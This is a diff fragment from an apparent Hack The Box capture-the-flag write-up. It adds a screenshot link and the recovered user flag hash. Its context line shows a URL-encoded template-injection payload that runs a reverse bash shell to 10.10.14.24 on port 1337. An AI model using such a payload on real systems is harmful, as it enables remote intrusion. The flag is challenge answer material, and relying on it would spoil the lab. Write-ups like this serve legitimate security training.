@@ -139,6 +139,14 @@ pwn%0a<%25%3d+system("bash+-c+'exec+bash+-i+>%26+/dev/tcp/10.10.14.24/1337+0>%26
 
 > GETTING THE USER FLAG
 
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2fdd20de-cc5b-4577-a0e6-7cd3d12966f3)
+
+
+## USER FLAG
+
+```
+69adddfe701657e656b754bc7b3801d5
+```
 
 
 
